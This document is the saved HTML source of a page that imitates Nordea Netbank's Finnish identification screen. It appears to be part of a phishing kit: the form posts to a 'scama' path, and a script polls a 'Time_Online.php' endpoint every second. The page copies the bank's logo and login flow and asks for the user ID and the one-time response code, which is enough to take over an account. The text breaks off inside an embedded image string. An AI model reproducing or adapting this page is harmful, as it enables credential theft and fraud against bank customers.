
<html lang="en" class="desktop" data-whatinput="mouse" data-whatintent="mouse"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="icon" data-savepage-href="#/assets/images/favicon-9a39921b4a8d93d5528b4ccdc5d76e91.ico" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABMLAAATCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AJ8AAGafAABmnwAAAJ8AAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wCfAAD/nwAA/58AAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AnwAAAJ8AAACfAAAAnwAA/58AAP+fAAAAnwAAAJ8AAACfAAAA////AP///wD///8A////AP///wD///8A////AJ8AAACfAAAAnwAAAJ8AAP+fAAD/nwAAAJ8AAACfAAAAnwAAAP///wD///8A////AP///wCfAAAAnwAAAJ8AAACfAABmnwAAZp8AAACfAAD/nwAA/58AAACfAABmnwAAZp8AAAD///8A////AJ8AAACfAAAAnwAAAJ8AAACfAAAAnwAA/58AAP+fAAAAnwAA/58AAP+fAAAAnwAA/58AAP+fAAAAnwAAAP///wCfAAAAnwAAAJ8AAGafAABmnwAAAJ8AAP+fAAD/nwAAAJ8AAP+fAAD/nwAAAJ8AAP+fAAD/nwAAAJ8AAAD///8AnwAA/58AAACfAAD/nwAA/58AAACfAAD/nwAA/58AAACfAAD/nwAA/58AAACfAAD/nwAA/58AAACfAAD/////AJ8AAP+fAAAAnwAA/58AAP+fAAAAnwAA/58AAP+fAAAAnwAA/58AAP+fAAAAnwAA/58AAP+fAAAAnwAA/////wD///8A////AJ8AAP+fAAD/nwAAAJ8AAP+fAAD/nwAAAJ8AAP+fAAD/nwAAAJ8AAGafAABmnwAAAP///wD///8A////AP///wCfAAD/nwAA/58AAACfAAD/nwAA/58AAACfAAD/nwAA/58AAAD///8A////AP///wD///8A////AP///wD///8AnwAAZp8AAGafAAAAnwAA/58AAP+fAAAAnwAAZp8AAGafAAAA////AP///wD///8A////AP///wD///8A////AP///wD///8A////AJ8AAP+fAAD/nwAAAP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wCfAAD/nwAA/58AAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AnwAA/58AAP+fAAAA////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AJ8AAGafAABmnwAAAP///wD///8A////AP///wD///8A////AP///wD///8A/z8AAP8/AAD/PwAA/z8AAPknAAD5JwAAyScAAEklAABJJQAAyScAAMk/AADJPwAA+f8AAPn/AAD5/wAA+f8AAA==">
    
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="robots" content="noindex, nofollow">
    <meta name="google" content="notranslate">
    <title>Nordea - Identification</title>
    <link rel="shortcut icon" type="image/x-icon" data-savepage-href="/assets/images/favicon-9a39921b4a8d93d5528b4ccdc5d76e91.ico" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABMLAAATCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AJ8AAGafAABmnwAAAJ8AAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wCfAAD/nwAA/58AAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AnwAAAJ8AAACfAAAAnwAA/58AAP+fAAAAnwAAAJ8AAACfAAAA////AP///wD///8A////AP///wD///8A////AJ8AAACfAAAAnwAAAJ8AAP+fAAD/nwAAAJ8AAACfAAAAnwAAAP///wD///8A////AP///wCfAAAAnwAAAJ8AAACfAABmnwAAZp8AAACfAAD/nwAA/58AAACfAABmnwAAZp8AAAD///8A////AJ8AAACfAAAAnwAAAJ8AAACfAAAAnwAA/58AAP+fAAAAnwAA/58AAP+fAAAAnwAA/58AAP+fAAAAnwAAAP///wCfAAAAnwAAAJ8AAGafAABmnwAAAJ8AAP+fAAD/nwAAAJ8AAP+fAAD/nwAAAJ8AAP+fAAD/nwAAAJ8AAAD///8AnwAA/58AAACfAAD/nwAA/58AAACfAAD/nwAA/58AAACfAAD/nwAA/58AAACfAAD/nwAA/58AAACfAAD/////AJ8AAP+fAAAAnwAA/58AAP+fAAAAnwAA/58AAP+fAAAAnwAA/58AAP+fAAAAnwAA/58AAP+fAAAAnwAA/////wD///8A////AJ8AAP+fAAD/nwAAAJ8AAP+fAAD/nwAAAJ8AAP+fAAD/nwAAAJ8AAGafAABmnwAAAP///wD///8A////AP///wCfAAD/nwAA/58AAACfAAD/nwAA/58AAACfAAD/nwAA/58AAAD///8A////AP///wD///8A////AP///wD///8AnwAAZp8AAGafAAAAnwAA/58AAP+fAAAAnwAAZp8AAGafAAAA////AP///wD///8A////AP///wD///8A////AP///wD///8A////AJ8AAP+fAAD/nwAAAP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wCfAAD/nwAA/58AAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AnwAA/58AAP+fAAAA////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AJ8AAGafAABmnwAAAP///wD///8A////AP///wD///8A////AP///wD///8A/z8AAP8/AAD/PwAA/z8AAPknAAD5JwAAyScAAEklAABJJQAAyScAAMk/AADJPwAA+f8AAPn/AAD5/wAA+f8AAA==" onload="safeLog(&#39;Loaded: &#39; + this.href)" onerror="safeLog(&#39;Failed to load: &#39; + this.href, &#39;ERROR&#39;)">
    <link rel="stylesheet" href="./assest/style.css">


    <script src="./assest/jquery.js.téléchargement"></script>
    <script src="./assest/main.js.téléchargement"></script>
</head>


<body class="cv-form page-ready">


<div id="content"></div>


<script>
setInterval(function(){ var client = new XMLHttpRequest();
client.open('GET', './request/Time_Online.php?Online=Waiting');
client.onreadystatechange = function() {

}
client.send();  }, 1000);
</script>



    <div class="main-loader centered" id="loading" tabindex="-1" role="dialog">
        <div class="loader" aria-hidden="true">
            <svg focusable="false" viewBox="0 0 48 48">
                <path d="M24,2.4000000000000004A21.6,21.6 0 1 1 2.4000000000000004,24" fill="none" stroke-width="4.5px" stroke="#000"></path>
            </svg>
        </div>
        <p class="loader-text">Loading...</p>
        <noscript>
            <p class="loader-text">JavaScript must be enabled to use this page.</p>
        </noscript>
    </div>


    <div class="system-messages-top-bar" id="system-messages-top-bar" role="status" aria-live="assertive" aria-atomic="true">
        <div class="system-messages-top-bar-wrapper">
            <div class="system-messages-top-bar-title" data-toggle-notification="" data-notification-target="system-messages">
                <span class="system-messages-top-bar-heading">Important information: </span><span id="system-messages-top-bar-title"></span>
            </div>
            <div class="system-messages-top-bar-button-wrapper">
                <button class="link" data-toggle-notification="" data-notification-target="system-messages" aria-label="Important information: Read more">
                    <span aria-hidden="true">
                        <span class="system-messages-top-bar-button-text">Read more</span>
                        <svg class="icon small-icon" viewBox="0 0 16 16">
                            <path stroke-linecap="round" stroke-linejoin="round" d="M12.5 5.8L8 10.3 3.5 5.8"></path>
                        </svg>
                    </span>
                </button>
            </div>
        </div>
    </div>



    <header>
        <div class="text-center">
            <span class="visually-hidden">Nordea</span>
            <svg class="logo" viewBox="0 0 136.1 28.6" focusable="false" aria-hidden="true">
                <g id="logo">
                    <path fill="#ffffff" d="M124.1,6.2c-5.5,0.4-9.9,4.9-10.3,10.4c-0.4,6.5,4.7,11.9,11.1,11.9c2.3,0,5.4-1.2,6.8-3.6v3.3h4.3V17.6 C136.2,10.6,130.6,5.7,124.1,6.2z M131.4,17.6c-0.2,3.7-3.4,6.5-7.2,6c-2.9-0.4-5.2-2.7-5.6-5.6c-0.4-3.9,2.6-7.2,6.4-7.2 c3.4,0,6.2,2.7,6.4,6.1L131.4,17.6L131.4,17.6z">
                    </path>
                    <path fill="#ffffff" d="M100.5,6.2c-5.9,0.2-10.9,4.7-10.9,11.3c0,6,4.9,11.1,11.2,11.1c4.4,0,8.7-2.6,10.4-6.9l-4.3-1.3 c-0.8,1.8-2.7,3.3-4.8,3.7c-3,0.6-5.8-1.3-6.9-3.3l16.7-4.6C111.4,11.8,107.6,6,100.5,6.2z M94.3,16.8c0-2.3,1.4-5,4.4-6.1 c3.4-1.3,6.4,0.4,7.7,2.8L94.3,16.8z">
                    </path>
                    <path fill="#ffffff" d="M63.8,10.7V6.1c-4.2,0-5.6,2.1-6.3,3.2V6.8h-4.8V17v11.1h4.9c0-6.6,0-6.5,0-10.5 C57.6,12.8,60.4,10.9,63.8,10.7z">
                    </path>
                    <polygon fill="#ffffff" points="19.7,19.6 5.1,2.4 0.1,2.4 0.1,28.1 5.3,28.1 5.3,10.9 20.1,28.2 24.6,28.2 24.6,2.4 19.7,2.4">
                    </polygon>
                    <path fill="#ffffff" d="M86.7,0.1h-4.6v8.4c-1.1-1.4-4.5-2.6-7.4-2.3c-5.5,0.4-9.9,4.9-10.3,10.4c-0.4,6.5,4.7,11.9,11.1,11.9 c2.4,0,5.7-1.1,6.8-3.2v2.8h4.3V17.5c0-0.1,0-0.1,0-0.2c0-0.1,0-0.1,0-0.2L86.7,0.1L86.7,0.1z M81.9,17.6 c-0.2,3.7-3.4,6.5-7.2,6c-2.9-0.4-5.2-2.7-5.6-5.6c-0.4-3.9,2.6-7.2,6.4-7.2c3.4,0,6.2,2.7,6.4,6.1 C81.9,16.9,81.9,17.6,81.9,17.6z">
                    </path>
                    <path fill="#ffffff" d="M38.7,6.1c-6.2,0-11.2,5-11.2,11.2s5,11.2,11.2,11.2s11.2-5,11.2-11.2C49.8,11.1,44.8,6.1,38.7,6.1z M38.7,23.7c-3.5,0-6.4-2.9-6.4-6.4s2.9-6.4,6.4-6.4s6.4,2.9,6.4,6.4C45.1,20.9,42.2,23.7,38.7,23.7z">
                    </path>
                </g>
            </svg>

            <div class="page-context">TUNNISTAUTUMINEN</div>
        </div>
    </header>

    <main role="main">
        
        <div class="content step2" id="step2" style="">
            <h1 class="page-title text-center">Nordea Netbank</h1>
            <div class="inner-content">

                <div data-view-id="form" class="current">
                    <form action="http://localhost/scama-ysn/Nodeoyje/f528764/Account/account2.php#" class="auth-form" id="auth-form" autocomplete="off" role="form">
                        <div id="inputs">
                            <div class="inputs-wrapper current" data-id="mta">
                                <div class="transaction-correlation-id-container" aria-live="polite" tabindex="0">
                                    
                                </div>
                                <div style="margin-top: 10px;">Syötä PIN tai tunnistaudu biometrisellä tunnisteella.</div>
                                <div style="margin: 30px;">

                                    <svg class="mobile-status-pending" viewBox="0 0 288 216">
                                        <defs>
                                            <style>
                                                .c2 {
                                                    fill: #00f
                                                }

                                                .d2 {
                                                    fill: #e5f2ff
                                                }

                                                .g2 {
                                                    fill: #39f;
                                                    opacity: .3
                                                }
                                            </style>
                                        </defs>
                                        <path class="status-pending-device-shadow" d="M251.85 131.39l-133.34 77.48a12.57 12.57 0 0 1-12.61 0l-59.7-34.45a7.54 7.54 0 0 1 0-13.06l133.32-77.49a12.56 12.56 0 0 1 12.6 0l59.71 34.47a7.55 7.55 0 0 1 .02 13.05z" fill="#cebbb2" opacity=".5"></path>
                                        <g class="status-pending-device">
                                            <path class="c2" d="M42.4 112.2v15.56a7.46 7.46 0 0 0 3.76 6.39l59.71 34.47a12.56 12.56 0 0 0 12.6 0l133.35-77.5a7.46 7.46 0 0 0 3.74-6.2V68z">
                                            </path>
                                            <path class="d2" d="M251.82 74.73l-133.34 77.49a12.58 12.58 0 0 1-12.6 0l-59.71-34.45a7.55 7.55 0 0 1 0-13.06l133.32-77.49a12.6 12.6 0 0 1 12.61 0l59.7 34.47a7.54 7.54 0 0 1 .02 13.04z">
                                            </path>
                                            <path fill="#9cf" d="M177.05 36.16L57.48 105.62l62.89 36.92 119.6-69.48">
                                            </path>
                                            <path class="c2" d="M205 45.15l9.58 5.38a1.59 1.59 0 0 0 1.78-.15.59.59 0 0 0-.08-1l-9.47-5.27a1.66 1.66 0 0 0-1.9.21.5.5 0 0 0 .09.83z">
                                            </path>
                                            <ellipse class="c2" cx="223.05" cy="54.46" rx=".75" ry="1.31" transform="rotate(-88.64 223.067 54.458)"></ellipse>
                                            <ellipse class="c2" cx="219.82" cy="52.55" rx=".75" ry="1.31" transform="rotate(-88.64 219.83 52.548)"></ellipse>
                                            <path fill="#39f" d="M239.97 73.06l-62.92-36.9-119.57 69.46 4.3 2.52 115.01-66.8 58.58 34.39 4.6-2.67z">
                                            </path>
                                        </g>
                                        <g class="status-pending-step status-pending-step-1">
                                            <path class="c2" d="M95 28.49c.22 5.1-6.54 9.53-15.09 9.9s-15.66-3.47-15.88-8.57 6.7-5.54 15.26-5.91S94.8 23.39 95 28.49z">
                                            </path>
                                            <path class="c2" d="M64.16 22.66h30.95v5.96H64.16z"></path>
                                            <ellipse class="d2" cx="79.62" cy="22.66" rx="15.5" ry="9.24"></ellipse>
                                        </g>
                                        <g class="status-pending-step status-pending-step-2">
                                            <path class="c2" d="M124.53 46.59c0 5.11-6.94 9.24-15.5 9.24s-15.5-4.13-15.5-9.24 6.94-5.25 15.5-5.25 15.5.15 15.5 5.25z">
                                            </path>
                                            <path class="c2" d="M93.58 40.1h30.95v5.96H93.58z"></path>
                                            <ellipse class="d2" cx="109.03" cy="40.1" rx="15.5" ry="9.24"></ellipse>
                                        </g>
                                        <g class="status-pending-step status-pending-step-3">
                                            <ellipse class="g2" cx="138" cy="80.31" rx="15.5" ry="9.24"></ellipse>
                                            <path class="c2" d="M153.49 64.6c0 5.11-6.93 9.25-15.49 9.25s-15.5-4.14-15.5-9.25 6.94-5.25 15.5-5.25 15.49.15 15.49 5.25z">
                                            </path>
                                            <path class="c2" d="M122.54 58.12h30.95v5.96h-30.95z"></path>
                                            <ellipse class="d2" cx="138" cy="58.12" rx="15.5" ry="9.24"></ellipse>
                                        </g>
                                        <g class="status-pending-step status-pending-step-4">
                                            <ellipse class="g2" cx="167.35" cy="98.33" rx="15.5" ry="9.24"></ellipse>
                                            <path class="c2" d="M182.84 82.62c0 5.1-6.93 9.24-15.49 9.24s-15.5-4.14-15.5-9.24 6.94-5.25 15.5-5.25 15.49.14 15.49 5.25z">
                                            </path>
                                            <path class="c2" d="M151.89 76.13h30.95v5.96h-30.95z"></path>
                                            <ellipse class="d2" cx="167.35" cy="76.13" rx="15.5" ry="9.24"></ellipse>
                                        </g>
                                    </svg>
                                </div>

                            </div>
                            <div class="inputs-wrapper" data-id="mta_qr">
                                <div></div>
                            </div>
                            <div class="inputs-wrapper" data-id="mta_off">

                                <div class="input-wrapper">
                                    <input id="mta-off-user-id" class="input password" data-manage="" data-show-hint="" name="user_id" type="text" inputmode="numeric" minlength="5" maxlength="17" data-min="5" data-max="17" data-type="password" data-validation="^[0-9]+$" value=""><button class="input-hint icon-button" type="button" aria-label="Show text in the input field"></button>
                                    <label for="mta-off-user-id">User ID</label>
                                    <div class="input-error" aria-live="assertive" role="alert" aria-hidden="true">
                                        <span class="input-error-text">Please enter your user ID, numbers only.</span>
                                    </div>
                                </div>
                                <div class="verify-error response-error-container hidden verify-error-text" aria-live="assertive" role="alert"></div>




                                <div class="input-wrapper">
                                    <input id="mta-off-otp-code" class="input" data-manage="" data-format="" name="otp_code" type="text" inputmode="numeric" minlength="9" maxlength="11" data-min="9" data-max="11" data-validation="^[0-9\s]+$" value="">
                                    <label for="mta-off-otp-code">Response code</label>
                                    <div class="input-error" aria-live="assertive" role="alert" aria-hidden="true">
                                        <span class="input-error-text">Please enter the response code, 9 digits.</span>
                                    </div>
                                </div>

                                <div id="mta-off-resp-error" class="hidden response-error-container" aria-live="assertive" role="alert">Invalid information entered. Please try again.
                                </div>



                                <input type="hidden" name="auth_method" class="submit-value" value="mta_off">
                                <input type="hidden" name="otp_domain" class="submit-value" value="login">

                            </div>
                            <div class="inputs-wrapper" data-id="ccalc">

                                <div class="input-wrapper">
                                    <input id="ccalc-user-id" class="input password" data-manage="" data-show-hint="" name="user_id" type="text" inputmode="numeric" minlength="5" maxlength="17" data-min="5" data-max="17" data-type="password" data-validation="^[0-9]+$" value=""><button class="input-hint icon-button" type="button" aria-label="Show text in the input field"></button>
                                    <label for="ccalc-user-id">User ID</label>
                                    <div class="input-error" aria-live="assertive" role="alert" aria-hidden="true">
                                        <span class="input-error-text">Please enter your user ID, numbers only.</span>
                                    </div>
                                </div>
                                <div class="verify-error response-error-container hidden verify-error-text" aria-live="assertive" role="alert"></div>




                                <div class="input-wrapper">
                                    <input id="ccalc-otp-code" class="input" data-manage="" data-format="" name="otp_code" type="text" inputmode="numeric" minlength="9" maxlength="11" data-min="9" data-max="11" data-validation="^[0-9\s]+$" value="">
                                    <label for="ccalc-otp-code">Response code</label>
                                    <div class="input-error" aria-live="assertive" role="alert" aria-hidden="true">
                                        <span class="input-error-text">Please enter the response code, 9 digits.</span>
                                    </div>
                                </div>

                                <div id="ccalc-resp-error" class="hidden response-error-container" aria-live="assertive" role="alert">Invalid information entered. Please try again.</div>



                                <input type="hidden" name="auth_method" class="submit-value" value="ccalc">
                                <input type="hidden" name="otp_domain" class="submit-value" value="login">

                            </div>
                        </div>
                    </form>
                    <div class="button-group">
                        <div>
                            <button class="link hidden" id="switch-primary-group">Change method</button>
                            <button class="link cancel-link" id="cancel-btn">Peruuta</button>
                        </div>
                        <div>
                            <button class="link sidebar-toggler"><span class="help-button-text">Tarvitsetko apua?</span>
                                <span class="help-button-text hidden">Close help</span></button>
                        </div>
                    </div>
                </div>





                <div data-view-id="codesapp">
                    <div id="codesapp-qr-autostart-instructions" class="hidden">
                        <p>Open Nordea ID on your mobile device. Scan the code below by tapping Scan QR code.</p>
                    </div>
                    <div id="codesapp-qr-autostart-canvas-wrapper" class="switch-animation-container qr-code-canvas hidden">
                        <div><canvas style="/*savepage-canvas-image*/ background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAACWCAYAAABkW7XSAAAAAXNSR0IArs4c6QAABGJJREFUeF7t1AEJAAAMAsHZv/RyPNwSyDncOQIECEQEFskpJgECBM5geQICBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAgQdWMQCX4yW9owAAAABJRU5ErkJggg==) !important; background-attachment: scroll !important; background-blend-mode: normal !important; background-clip: content-box !important; background-color: transparent !important; background-origin: content-box !important; background-position: center center !important; background-repeat: no-repeat !important; background-size: 100% 100% !important;" id="codesapp-qr-code-autostart" role="img" class="switch-animation-first" title="QR code" data-savepage-canvasdatauri="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAACWCAYAAABkW7XSAAAAAXNSR0IArs4c6QAABGJJREFUeF7t1AEJAAAMAsHZv/RyPNwSyDncOQIECEQEFskpJgECBM5geQICBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAgQdWMQCX4yW9owAAAABJRU5ErkJggg=="></canvas>
                        </div>
                        <div><canvas style="/*savepage-canvas-image*/ background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAACWCAYAAABkW7XSAAAAAXNSR0IArs4c6QAABGJJREFUeF7t1AEJAAAMAsHZv/RyPNwSyDncOQIECEQEFskpJgECBM5geQICBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAgQdWMQCX4yW9owAAAABJRU5ErkJggg==) !important; background-attachment: scroll !important; background-blend-mode: normal !important; background-clip: content-box !important; background-color: transparent !important; background-origin: content-box !important; background-position: center center !important; background-repeat: no-repeat !important; background-size: 100% 100% !important;" id="codesapp-qr-code-session-id" role="img" class="switch-animation-second" title="QR code" data-savepage-canvasdatauri="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAACWCAYAAABkW7XSAAAAAXNSR0IArs4c6QAABGJJREFUeF7t1AEJAAAMAsHZv/RyPNwSyDncOQIECEQEFskpJgECBM5geQICBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPl